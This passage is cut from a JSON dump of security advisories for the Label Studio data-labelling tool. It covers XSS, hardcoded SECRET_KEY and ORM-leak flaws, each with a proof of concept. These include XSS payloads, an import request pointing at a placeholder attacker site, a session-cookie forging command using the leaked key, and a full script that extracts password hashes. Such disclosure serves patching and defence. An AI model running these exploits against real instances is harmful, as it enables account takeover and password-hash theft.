\"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  